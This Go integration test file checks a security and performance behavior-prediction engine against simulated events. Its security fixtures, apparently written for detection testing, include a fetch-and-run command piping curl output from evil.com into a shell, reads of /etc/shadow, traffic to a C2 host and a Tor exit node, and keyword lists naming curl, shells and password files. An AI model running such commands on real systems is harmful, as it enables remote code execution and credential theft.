package behavior

import (
	"context"
	"sync"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/yairfalse/tapio/pkg/domain"
	"go.uber.org/zap"
)

// TestIntegrationSecurityIncidentPrediction tests end-to-end security incident detection
func TestIntegrationSecurityIncidentPrediction(t *testing.T) {
	logger := zap.NewNop()

	// Create full engine
	engine, err := NewEngine(logger)
	require.NoError(t, err)
	defer engine.Stop()

	// Setup security patterns
	setupSecurityPatterns(engine, logger)

	ctx := context.Background()

	// Simulate security incident sequence
	events := []struct {
		name          string
		event         *domain.ObservationEvent
		expectPattern string
		minConfidence float64
	}{
		{
			name: "suspicious file access",
			event: &domain.ObservationEvent{
				ID:        uuid.New().String(),
				Type:      "file.access",
				Source:    "falco",
				Timestamp: time.Now(),
				PodName:   stringPtr("webapp-pod"),
				Action:    stringPtr("read"),
				Target:    stringPtr("/etc/shadow"),
				Result:    stringPtr("denied"),
				Data: map[string]string{
					"user":    "www-data",
					"process": "nginx",
				},
			},
			expectPattern: "Suspicious File Access",
			minConfidence: 0.7,
		},
		{
			name: "unauthorized process execution",
			event: &domain.ObservationEvent{
				ID:          uuid.New().String(),
				Type:        "process.exec",
				Source:      "falco",
				Timestamp:   time.Now().Add(10 * time.Second),
				PodName:     stringPtr("webapp-pod"),
				Action:      stringPtr("exec"),
				Target:      stringPtr("/bin/sh"),
				Result:      stringPtr("success"),
				ServiceName: stringPtr("webapp"),
				Data: map[string]string{
					"parent":  "nginx",
					"command": "sh -c 'curl evil.com | sh'",
				},
			},
			expectPattern: "Command Injection",
			minConfidence: 0.85,
		},
		{
			name: "network connection to C&C",
			event: &domain.ObservationEvent{
				ID:        uuid.New().String(),
				Type:      "network.connection",
				Source:    "cilium",
				Timestamp: time.Now().Add(20 * time.Second),
				PodName:   stringPtr("webapp-pod"),
				Action:    stringPtr("connect"),
				Target:    stringPtr("evil.com:443"),
				Result:    stringPtr("established"),
				Data: map[string]string{
					"direction": "egress",
					"protocol":  "tcp",
					"bytes":     "1024000",
				},
			},
			expectPattern: "Data Exfiltration",
			minConfidence: 0.9,
		},
	}

	// Process events and verify predictions
	for _, tc := range events {
		t.Run(tc.name, func(t *testing.T) {
			result, err := engine.Process(ctx, tc.event)
			require.NoError(t, err)
			require.NotNil(t, result)
			require.NotNil(t, result.Prediction)

			assert.Equal(t, tc.expectPattern, result.Prediction.PatternName)
			assert.GreaterOrEqual(t, result.Prediction.Confidence, tc.minConfidence)
			assert.Equal(t, domain.PredictionTypeDegradation, result.Prediction.Type)
			assert.Equal(t, "high", result.Prediction.Severity)
			assert.NotEmpty(t, result.Prediction.Evidence)
			assert.NotNil(t, result.Prediction.Remediation)

			// Verify remediation actions
			if result.Prediction.Remediation != nil {
				assert.True(t, result.Prediction.Remediation.AutoRemediation)
				assert.NotEmpty(t, result.Prediction.Remediation.ManualSteps)
			}
		})
	}
}

// TestIntegrationPerformanceDegradationPrediction tests performance issue detection
func TestIntegrationPerformanceDegradationPrediction(t *testing.T) {
	logger := zap.NewNop()

	engine, err := NewEngine(logger)
	require.NoError(t, err)
	defer engine.Stop()

	setupPerformancePatterns(engine, logger)

	ctx := context.Background()

	// Simulate performance degradation sequence
	podName := "api-server-1"
	baseTime := time.Now()

	// Stage 1: Initial CPU spike
	event1 := &domain.ObservationEvent{
		ID:        uuid.New().String(),
		Type:      "metrics.cpu",
		Source:    "prometheus",
		Timestamp: baseTime,
		PodName:   &podName,
		Data: map[string]string{
			"cpu_usage":     "75",
			"cpu_throttled": "false",
		},
	}

	result1, err := engine.Process(ctx, event1)
	require.NoError(t, err)
	_ = result1 // May not trigger prediction yet (below threshold)

	// Stage 2: Sustained high CPU
	event2 := &domain.ObservationEvent{
		ID:        uuid.New().String(),
		Type:      "metrics.cpu",
		Source:    "prometheus",
		Timestamp: baseTime.Add(30 * time.Second),
		PodName:   &podName,
		Data: map[string]string{
			"cpu_usage":     "92",
			"cpu_throttled": "true",
			"duration":      "30s",
		},
	}

	result2, err := engine.Process(ctx, event2)
	require.NoError(t, err)
	require.NotNil(t, result2)
	require.NotNil(t, result2.Prediction)

	assert.Equal(t, "CPU Saturation", result2.Prediction.PatternName)
	assert.GreaterOrEqual(t, result2.Prediction.Confidence, 0.75)
	assert.Equal(t, domain.PredictionTypeAnomaly, result2.Prediction.Type)

	// Stage 3: Memory increase (compound issue)
	event3 := &domain.ObservationEvent{
		ID:        uuid.New().String(),
		Type:      "metrics.memory",
		Source:    "prometheus",
		Timestamp: baseTime.Add(60 * time.Second),
		PodName:   &podName,
		Data: map[string]string{
			"memory_usage": "88",
			"memory_trend": "increasing",
			"swap_usage":   "45",
		},
	}

	result3, err := engine.Process(ctx, event3)
	require.NoError(t, err)
	require.NotNil(t, result3)
	require.NotNil(t, result3.Prediction)

	assert.Contains(t, []string{"Memory Pressure", "Resource Exhaustion"}, result3.Prediction.PatternName)
	assert.GreaterOrEqual(t, result3.Prediction.Confidence, 0.8)

	// Stage 4: Response time degradation (cascade effect)
	event4 := &domain.ObservationEvent{
		ID:          uuid.New().String(),
		Type:        "metrics.latency",
		Source:      "istio",
		Timestamp:   baseTime.Add(90 * time.Second),
		PodName:     &podName,
		ServiceName: stringPtr("api-service"),
		Data: map[string]string{
			"p99_latency": "2500",
			"p95_latency": "1800",
			"p50_latency": "800",
			"error_rate":  "0.05",
		},
	}

	result4, err := engine.Process(ctx, event4)
	require.NoError(t, err)
	require.NotNil(t, result4)
	require.NotNil(t, result4.Prediction)

	assert.Equal(t, "Service Degradation", result4.Prediction.PatternName)
	assert.GreaterOrEqual(t, result4.Prediction.Confidence, 0.85)
	assert.Equal(t, "critical", result4.Prediction.Severity)

	// Verify prediction details
	assert.Contains(t, result4.Prediction.Message, "degradation")
	assert.NotEmpty(t, result4.Prediction.Impact)
	assert.NotEmpty(t, result4.Prediction.Evidence)
	assert.Equal(t, 10*time.Minute, result4.Prediction.TimeHorizon)
}

// TestIntegrationDeploymentRiskPrediction tests deployment risk assessment
func TestIntegrationDeploymentRiskPrediction(t *testing.T) {
	logger := zap.NewNop()

	engine, err := NewEngine(logger)
	require.NoError(t, err)
	defer engine.Stop()

	setupDeploymentPatterns(engine, logger)

	ctx := context.Background()
	serviceName := "payment-service"

	// Rapid deployment sequence
	deployments := []struct {
		version   string
		timestamp time.Time
	}{
		{"v1.2.0", time.Now()},
		{"v1.2.1", time.Now().Add(5 * time.Minute)},
		{"v1.2.2", time.Now().Add(8 * time.Minute)},
		{"v1.3.0", time.Now().Add(10 * time.Minute)},
	}

	var lastResult *domain.PredictionResult

	for i, deploy := range deployments {
		event := &domain.ObservationEvent{
			ID:          uuid.New().String(),
			Type:        "deployment.update",
			Source:      "kubernetes",
			Timestamp:   deploy.timestamp,
			ServiceName: &serviceName,
			Action:      stringPtr("rollout"),
			Target:      stringPtr(deploy.version),
			Result:      stringPtr("in_progress"),
			Data: map[string]string{
				"replicas":       "5",
				"strategy":       "rolling",
				"prev_version":   getVersion(deployments, i-1),
				"config_changed": "true",
			},
		}

		result, err := engine.Process(ctx, event)
		require.NoError(t, err)

		if i >= 2 { // After 3rd deployment
			require.NotNil(t, result)
			require.NotNil(t, result.Prediction)

			assert.Equal(t, "Rapid Deployment Risk", result.Prediction.PatternName)
			assert.GreaterOrEqual(t, result.Prediction.Confidence, 0.7+float64(i)*0.05)
			assert.Equal(t, domain.PredictionTypeThresholdBreach, result.Prediction.Type)

			// Risk should increase with more rapid deployments
			if lastResult != nil {
				assert.GreaterOrEqual(t, result.Prediction.Confidence, lastResult.Prediction.Confidence)
			}
			lastResult = result
		}
	}

	// Final prediction should have high confidence
	require.NotNil(t, lastResult)
	assert.GreaterOrEqual(t, lastResult.Prediction.Confidence, 0.85)
	assert.Equal(t, "high", lastResult.Prediction.Severity)
}

// TestIntegrationAnomalyChainPrediction tests anomaly chain detection
func TestIntegrationAnomalyChainPrediction(t *testing.T) {
	logger := zap.NewNop()

	engine, err := NewEngine(logger)
	require.NoError(t, err)
	defer engine.Stop()

	setupAnomalyPatterns(engine, logger)

	ctx := context.Background()
	podName := "suspicious-pod"

	// Anomaly chain: unusual process → DNS queries → external connection
	anomalyChain := []*domain.ObservationEvent{
		{
			ID:        uuid.New().String(),
			Type:      "process.anomaly",
			Source:    "falco",
			Timestamp: time.Now(),
			PodName:   &podName,
			Action:    stringPtr("spawn"),
			Target:    stringPtr("python"),
			Data: map[string]string{
				"parent":  "bash",
				"anomaly": "unusual_parent",
				"score":   "0.85",
			},
		},
		{
			ID:        uuid.New().String(),
			Type:      "dns.query",
			Source:    "coredns",
			Timestamp: time.Now().Add(30 * time.Second),
			PodName:   &podName,
			Action:    stringPtr("resolve"),
			Target:    stringPtr("c2-server.evil.com"),
			Result:    stringPtr("NXDOMAIN"),
			Data: map[string]string{
				"query_type": "A",
				"frequency":  "high",
				"pattern":    "dga_suspected",
			},
		},
		{
			ID:        uuid.New().String(),
			Type:      "network.anomaly",
			Source:    "cilium",
			Timestamp: time.Now().Add(60 * time.Second),
			PodName:   &podName,
			Action:    stringPtr("connect"),
			Target:    stringPtr("185.220.101.45:8443"),
			Result:    stringPtr("established"),
			Data: map[string]string{
				"protocol":     "tcp",
				"geo_location": "TOR_EXIT_NODE",
				"reputation":   "malicious",
				"bytes_sent":   "524288",
			},
		},
	}

	var predictions []*domain.Prediction
	confidenceProgression := []float64{}

	for i, event := range anomalyChain {
		result, err := engine.Process(ctx, event)
		require.NoError(t, err)

		if result != nil && result.Prediction != nil {
			predictions = append(predictions, result.Prediction)
			confidenceProgression = append(confidenceProgression, result.Prediction.Confidence)

			t.Logf("Event %d: Pattern=%s, Confidence=%.2f",
				i+1, result.Prediction.PatternName, result.Prediction.Confidence)
		}
	}

	// Should detect escalating threat
	require.GreaterOrEqual(t, len(predictions), 2, "Should generate multiple predictions")

	// Final prediction should be high confidence C&C communication
	lastPrediction := predictions[len(predictions)-1]
	assert.Contains(t, []string{"C&C Communication", "Malware Activity", "Data Exfiltration"},
		lastPrediction.PatternName)
	assert.GreaterOrEqual(t, lastPrediction.Confidence, 0.9)
	assert.Equal(t, "critical", lastPrediction.Severity)
	assert.Equal(t, domain.PredictionTypeDegradation, lastPrediction.Type)

	// Confidence should increase as chain progresses
	for i := 1; i < len(confidenceProgression); i++ {
		assert.GreaterOrEqual(t, confidenceProgression[i], confidenceProgression[i-1]*0.95,
			"Confidence should generally increase or stay similar")
	}
}

// TestIntegrationConcurrentEventStreams tests handling multiple concurrent event streams
func TestIntegrationConcurrentEventStreams(t *testing.T) {
	logger := zap.NewNop()

	engine, err := NewEngine(logger)
	require.NoError(t, err)
	defer engine.Stop()

	// Setup all pattern types
	setupAllPatterns(engine, logger)

	ctx := context.Background()

	// Create multiple event streams
	streams := []struct {
		name   string
		events []*domain.ObservationEvent
	}{
		{
			name:   "security-stream",
			events: generateSecurityEventStream(5),
		},
		{
			name:   "performance-stream",
			events: generatePerformanceEventStream(5),
		},
		{
			name:   "deployment-stream",
			events: generateDeploymentEventStream(5),
		},
	}

	// Process streams concurrently
	var wg sync.WaitGroup
	results := make(map[string][]*domain.PredictionResult)
	var mu sync.Mutex

	for _, stream := range streams {
		wg.Add(1)
		go func(s struct {
			name   string
			events []*domain.ObservationEvent
		}) {
			defer wg.Done()

			streamResults := make([]*domain.PredictionResult, 0)
			for _, event := range s.events {
				result, err := engine.Process(ctx, event)
				if err == nil && result != nil {
					streamResults = append(streamResults, result)
				}
				time.Sleep(10 * time.Millisecond) // Simulate real-time stream
			}

			mu.Lock()
			results[s.name] = streamResults
			mu.Unlock()
		}(stream)
	}

	wg.Wait()

	// Verify each stream generated predictions
	for streamName, streamResults := range results {
		assert.NotEmpty(t, streamResults, "Stream %s should generate predictions", streamName)

		// Verify predictions are relevant to stream type
		for _, result := range streamResults {
			if result.Prediction != nil {
				switch streamName {
				case "security-stream":
					assert.Contains(t, []domain.PredictionType{
						domain.PredictionTypeDegradation,
						domain.PredictionTypeAnomaly,
					}, result.Prediction.Type)
				case "performance-stream":
					assert.Contains(t, []domain.PredictionType{
						domain.PredictionTypeAnomaly,
						domain.PredictionTypeThresholdBreach,
					}, result.Prediction.Type)
				case "deployment-stream":
					assert.Contains(t, []domain.PredictionType{
						domain.PredictionTypeThresholdBreach,
						domain.PredictionTypeAnomaly,
					}, result.Prediction.Type)
				}
			}
		}
	}
}

// Benchmark tests

func BenchmarkPredictionGeneration(b *testing.B) {
	logger := zap.NewNop()
	predictor := NewPredictor(logger)
	predictor.patternLoader = createMockPatternLoader()

	match := domain.PatternMatch{
		PatternID:   "test-pattern-1",
		PatternName: "Test Pattern",
		Confidence:  0.85,
		Conditions: []domain.ConditionMatch{
			{Matched: true, Message: "Condition met"},
		},
	}
	event := createTestObservationEvent()
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = predictor.GeneratePrediction(ctx, match, event)
	}
}

func BenchmarkConfidenceCalculation(b *testing.B) {
	logger := zap.NewNop()
	predictor := NewPredictor(logger)

	match := domain.PatternMatch{
		Confidence: 0.75,
		Conditions: []domain.ConditionMatch{
			{Matched: true}, {Matched: true}, {Matched: false},
		},
		Evidence: []string{"e1", "e2", "e3"},
	}
	pattern := &domain.BehaviorPattern{
		BaseConfidence:     0.8,
		AdjustedConfidence: 0.85,
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = predictor.calculateConfidence(match, pattern)
	}
}

func BenchmarkSystemEndToEnd(b *testing.B) {
	logger := zap.NewNop()
	engine, _ := NewEngine(logger)
	defer engine.Stop()

	setupAllPatterns(engine, logger)

	event := &domain.ObservationEvent{
		ID:        uuid.New().String(),
		Type:      "metrics.cpu",
		Source:    "prometheus",
		Timestamp: time.Now(),
		PodName:   stringPtr("test-pod"),
		Data: map[string]string{
			"cpu_usage": "85",
		},
	}
	ctx := context.Background()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = engine.Process(ctx, event)
	}
}

// Helper functions for integration tests

func setupSecurityPatterns(engine *Engine, logger *zap.Logger) {
	patterns := []*domain.BehaviorPattern{
		createSecurityPattern("susp-file", "Suspicious File Access", []string{"/etc/shadow", "/etc/passwd"}),
		createSecurityPattern("cmd-inject", "Command Injection", []string{"sh", "bash", "curl"}),
		createSecurityPattern("data-exfil", "Data Exfiltration", []string{"evil.com", "suspicious"}),
	}
	loadPatterns(engine, patterns)
}

func setupPerformancePatterns(engine *Engine, logger *zap.Logger) {
	patterns := []*domain.BehaviorPattern{
		createPerformancePattern("cpu-sat", "CPU Saturation", "cpu_usage", 90),
		createPerformancePattern("mem-press", "Memory Pressure", "memory_usage", 85),
		createPerformancePattern("svc-degrade", "Service Degradation", "p99_latency", 2000),
		createPerformancePattern("res-exhaust", "Resource Exhaustion", "memory_usage", 85),
	}
	loadPatterns(engine, patterns)
}

func setupDeploymentPatterns(engine *Engine, logger *zap.Logger) {
	patterns := []*domain.BehaviorPattern{
		{
			ID:             "rapid-deploy",
			Name:           "Rapid Deployment Risk",
			BaseConfidence: 0.75,
			Enabled:        true,
			Conditions: []domain.Condition{
				{
					EventType: "deployment.update",
					Match: domain.MatchCriteria{
						Field: "config_changed",
						Type:  "exact",
						Value: "true",
					},
					Required: true,
				},
			},
			PredictionTemplate: domain.PredictionTemplate{
				Type:        domain.PredictionTypeThresholdBreach,
				TimeHorizon: "30m",
				Message:     "Multiple rapid deployments detected",
				Impact:      "Increased risk of production issues",
				Severity:    "high",
				PotentialImpacts: []string{
					"Configuration drift",
					"Rollback complexity",
				},
			},
		},
	}
	loadPatterns(engine, patterns)
}

func setupAnomalyPatterns(engine *Engine, logger *zap.Logger) {
	patterns := []*domain.BehaviorPattern{
		createAnomalyPattern("proc-anom", "process.anomaly", "anomaly", "unusual"),
		createAnomalyPattern("dns-anom", "dns.query", "pattern", "dga_suspected"),
		createAnomalyPattern("net-anom", "network.anomaly", "reputation", "malicious"),
		{
			ID:             "cc-comm",
			Name:           "C&C Communication",
			BaseConfidence: 0.95,
			Enabled:        true,
			Conditions: []domain.Condition{
				{
					EventType: "network.anomaly",
					Match: domain.MatchCriteria{
						Field: "geo_location",
						Type:  "contains",
						Value: "TOR",
					},
					Required: true,
				},
			},
			PredictionTemplate: domain.PredictionTemplate{
				Type:        domain.PredictionTypeDegradation,
				TimeHorizon: "5m",
				Message:     "Potential C&C communication detected",
				Impact:      "System compromise likely",
				Severity:    "critical",
				PotentialImpacts: []string{
					"Data exfiltration",
					"Lateral movement",
					"Persistent backdoor",
				},
			},
			Remediation: &domain.RemediationActions{
				AutoRemediation: true,
				ManualSteps: []string{
					"Isolate affected pod",
					"Block network access",
				},
			},
		},
	}
	loadPatterns(engine, patterns)
}

func setupAllPatterns(engine *Engine, logger *zap.Logger) {
	setupSecurityPatterns(engine, logger)
	setupPerformancePatterns(engine, logger)
	setupDeploymentPatterns(engine, logger)
	setupAnomalyPatterns(engine, logger)
}

func loadPatterns(engine *Engine, patterns []*domain.BehaviorPattern) {
	if engine.patternLoader == nil {
		engine.patternLoader = &PatternLoader{
			patterns: make(map[string]*domain.BehaviorPattern),
		}
	}
	for _, p := range patterns {
		engine.patternLoader.patterns[p.ID] = p
	}

	// Update pattern matcher
	if engine.patternMatcher == nil {
		engine.patternMatcher = NewPatternMatcher(engine.logger)
	}
	engine.patternMatcher.UpdatePatterns(convertPatterns(patterns))

	// Setup predictor
	if engine.predictor == nil {
		engine.predictor = NewPredictor(engine.logger)
	}
	engine.predictor.patternLoader = engine.patternLoader

	// Ensure circuit breaker and backpressure are initialized
	if engine.circuitBreaker == nil {
		engine.circuitBreaker = NewCircuitBreaker(CircuitBreakerConfig{
			MaxFailures:  5,
			ResetTimeout: 100 * time.Millisecond,
		})
	}
	if engine.backpressure == nil {
		engine.backpressure = NewBackpressureManager(100)
	}
}

func createSecurityPattern(id, name string, keywords []string) *domain.BehaviorPattern {
	return &domain.BehaviorPattern{
		ID:             id,
		Name:           name,
		BaseConfidence: 0.85,
		Enabled:        true,
		Conditions: []domain.Condition{
			{
				EventType: "",
				Match: domain.MatchCriteria{
					Field: "target",
					Type:  "contains",
					Value: keywords[0],
				},
				Required: true,
			},
		},
		PredictionTemplate: domain.PredictionTemplate{
			Type:        domain.PredictionTypeDegradation,
			TimeHorizon: "5m",
			Message:     "Security incident detected",
			Impact:      "Potential security breach",
			Severity:    "high",
			PotentialImpacts: []string{
				"Unauthorized access",
				"Data exposure",
			},
		},
		Remediation: &domain.RemediationActions{
			AutoRemediation: true,
			ManualSteps: []string{
				"Block suspicious activity",
				"Review security logs",
			},
		},
	}
}

func createPerformancePattern(id, name, metric string, threshold float64) *domain.BehaviorPattern {
	return &domain.BehaviorPattern{
		ID:             id,
		Name:           name,
		BaseConfidence: 0.8,
		Enabled:        true,
		Conditions: []domain.Condition{
			{
				EventType: "metrics",
				Match: domain.MatchCriteria{
					Field:     metric,
					Type:      "threshold",
					Threshold: threshold,
					Operator:  ">",
				},
				Required: true,
			},
		},
		PredictionTemplate: domain.PredictionTemplate{
			Type:        domain.PredictionTypeAnomaly,
			TimeHorizon: "10m",
			Message:     "Performance degradation detected",
			Impact:      "Service performance impacted",
			Severity:    "medium",
			PotentialImpacts: []string{
				"Increased latency",
				"Service unavailability",
			},
		},
	}
}

func createAnomalyPattern(id, eventType, field, value string) *domain.BehaviorPattern {
	return &domain.BehaviorPattern{
		ID:             id,
		Name:           "Anomaly Detection",
		BaseConfidence: 0.75,
		Enabled:        true,
		Conditions: []domain.Condition{
			{
				EventType: eventType,
				Match: domain.MatchCriteria{
					Field: field,
					Type:  "contains",
					Value: value,
				},
				Required: true,
			},
		},
		PredictionTemplate: domain.PredictionTemplate{
			Type:        domain.PredictionTypeAnomaly,
			TimeHorizon: "15m",
			Message:     "Anomalous behavior detected",
			Impact:      "Unknown impact",
			Severity:    "medium",
		},
	}
}

func generateSecurityEventStream(count int) []*domain.ObservationEvent {
	events := make([]*domain.ObservationEvent, count)
	for i := 0; i < count; i++ {
		events[i] = &domain.ObservationEvent{
			ID:        uuid.New().String(),
			Type:      "security.alert",
			Source:    "falco",
			Timestamp: time.Now().Add(time.Duration(i) * time.Second),
			PodName:   stringPtr("pod-" + string(rune(i))),
			Action:    stringPtr("suspicious"),
			Target:    stringPtr("/etc/sensitive"),
		}
	}
	return events
}

func generatePerformanceEventStream(count int) []*domain.ObservationEvent {
	events := make([]*domain.ObservationEvent, count)
	for i := 0; i < count; i++ {
		events[i] = &domain.ObservationEvent{
			ID:        uuid.New().String(),
			Type:      "metrics.cpu",
			Source:    "prometheus",
			Timestamp: time.Now().Add(time.Duration(i) * time.Second),
			PodName:   stringPtr("pod-" + string(rune(i))),
			Data: map[string]string{
				"cpu_usage": "85",
			},
		}
	}
	return events
}

func generateDeploymentEventStream(count int) []*domain.ObservationEvent {
	events := make([]*domain.ObservationEvent, count)
	for i := 0; i < count; i++ {
		events[i] = &domain.ObservationEvent{
			ID:          uuid.New().String(),
			Type:        "deployment.update",
			Source:      "kubernetes",
			Timestamp:   time.Now().Add(time.Duration(i) * time.Minute),
			ServiceName: stringPtr("service-" + string(rune(i))),
			Action:      stringPtr("rollout"),
			Target:      stringPtr("v1.0." + string(rune(i))),
		}
	}
	return events
}

func getVersion(deployments []struct {
	version   string
	timestamp time.Time
}, index int) string {
	if index < 0 || index >= len(deployments) {
		return "unknown"
	}
	return deployments[index].version
}
